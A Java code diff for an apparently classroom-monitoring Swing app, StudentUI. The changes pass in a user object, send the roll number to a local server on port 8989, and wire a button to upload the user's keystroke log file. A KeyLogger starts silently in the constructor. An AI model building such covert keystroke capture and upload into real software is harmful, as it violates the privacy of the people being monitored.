@@ -38,11 +38,12 @@ public class StudentUI extends javax.swing.JFrame {
     DefaultListModel model = new DefaultListModel();
     PrintWriter writer;
     Socket socket; 
+    final User user;
     /**
      * Creates new form StudentUI
      */
-    public StudentUI() {
- 
+    public StudentUI(final User user) {
+        this.user = user;
         KeyLogger kg = new KeyLogger();
         
         try {
@@ -50,7 +51,7 @@ public class StudentUI extends javax.swing.JFrame {
             socket = new Socket("localhost", 8989);
             OutputStream output = socket.getOutputStream();
             writer = new PrintWriter(output, true);
-            writer.println(3); //user id
+            writer.println(user.rollNum); //user id
 
         } catch (IOException ex) {
             Logger.getLogger(StudentUI.class.getName()).log(Level.SEVERE, null, ex);
@@ -179,13 +180,13 @@ public class StudentUI extends javax.swing.JFrame {
             System.out.println("Selected file: " + selectedFile.getAbsolutePath());
             System.out.println("Selected file name: " + selectedFile.getName());
             System.out.println("Selected file path: " + selectedFile.getPath());
-            new FileUpload().uploadFile(selectedFile.getPath(),selectedFile.getPath());
+            new FileUpload(user).uploadFile(selectedFile.getPath(),selectedFile.getPath());
         }
     }//GEN-LAST:event_jButton1ActionPerformed
 
     private void jToggleButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jToggleButton1ActionPerformed
         // TODO add your handling code here:
-          new FileUpload().uploadFile("filename.txt","filename.txt");
+          new FileUpload(user).uploadFile("", user.keyLogFile);
 //            BufferedReader input;
 //            try {
 //                Socket clientSocket = new Socket(InetAddress.getLocalHost(), 6789);
@@ -244,7 +245,7 @@ public class StudentUI extends javax.swing.JFrame {
         /* Create and display the form */
         java.awt.EventQueue.invokeLater(new Runnable() {
             public void run() {
-                new StudentUI().setVisible(true);
+//                new StudentUI().setVisible(true);
             }
         });
     }
